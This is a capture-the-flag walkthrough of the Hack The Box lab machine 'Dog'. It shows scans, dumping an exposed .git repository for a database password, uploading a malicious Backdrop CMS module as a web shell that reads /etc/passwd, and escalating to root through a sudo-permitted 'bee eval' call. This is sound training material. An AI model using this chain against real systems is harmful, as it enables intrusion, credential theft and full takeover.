# Dog - easy


## Nmap Enumeration

```
sudo nmap 10.10.11.58 -p- -Pn                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 04:46 EDT
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 16.13 seconds
```

```
sudo nmap 10.10.11.58 -p 22,80 -Pn -sC -sV 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-22 04:46 EDT
Nmap scan report for dog.htb (10.10.11.58)
Host is up (0.039s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.10.11.58:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-title: Home | Dog
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.42 seconds
```

### Web Enumeration 

```
ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.10.11.58/FUZZ -mc all -fc 404

files                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 36ms]
themes                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 38ms]
modules                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 49ms]
sites                   [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 50ms]
core                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 40ms]
layouts                 [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 50ms]
```

```
ffuf -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt  -u http://10.10.11.58/FUZZ -mc all -fc 404

LICENSE.txt             [Status: 200, Size: 18092, Words: 3133, Lines: 340, Duration: 38ms]
index.php               [Status: 200, Size: 13332, Words: 1368, Lines: 202, Duration: 66ms]
.htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 70ms]
robots.txt              [Status: 200, Size: 1198, Words: 114, Lines: 47, Duration: 46ms]
settings.php            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 54ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 32ms]
.htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 52ms]
.htm                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 37ms]
.git                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 49ms]
.htpasswds              [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 36ms]
.htgroup                [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 46ms]
wp-forum.phps           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 62ms]
.htaccess.bak           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 49ms]
.htuser                 [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 34ms]
.ht                     [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 43ms]
.htc                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 45ms]
```

Aftert some researches, we find an user mail address:
```
http://10.10.11.58/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json

tiffany@dog.htb
```

We found a `.git` folder too. We use [githacker](https://github.com/WangYihang/GitHacker?tab=readme-ov-file) to dump the repository: 
```
python -m ven venv
cd env
source bin/activate

githacker --url http://dog.htb/.git/ --output-folder result
```

We find the credentials of the database in `setting.php`:
```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

With the mail found in the configuration files and the database password in the repository, we can login to the site:
```
tiffany
BackDropJ2024DS2024
```


The site is powered by Backdrop CMS 1.27.1 and is vulnerable. We can perform a Remote Command Execution by installing a malicious module manually with a php shell script. We find an [exploit](https://www.exploit-db.com/exploits/52021) on exploitDB.
```
python3 script.py http://dog.htb
Backdrop CMS 1.27.1 - Remote Command Execution Exploit
Evil module generating...
Evil module generated! shell.zip
Go to http://dog.htb/admin/modules/install and upload the shell.zip for Manual Installation.
Your shell address: http://dog.htb/modules/shell/shell.php
```

A `/shell` folder is created, next we create an archive and upload it on the site via the manual installation `http://dog.htb/admin/modules/install`:
```
tar -czvf shell.tar.gz shell/
```

We can now execute commands:
```
http://10.10.11.58/modules/shell/shell.php?cmd=cat+%2Fetc%2Fpasswd
```

On the machine we find the user `johncusack`:
```
johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
```

We have access to the machine wtih `johncusack:BackDropJ2024DS2024`


## Privilege escalation

```
johncusack@dog:~$ sudo -l 
[sudo] password for johncusack: 
Matching Defaults entries for johncusack on dog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```

We found that `bee` can perform the command `eval` which run php code:

```
johncusack@dog:~$ sudo /usr/local/bin/bee --help
...
  eval
   ev, php-eval
   Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
```

We specify the backdrop repository to make it works:
```
sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
```
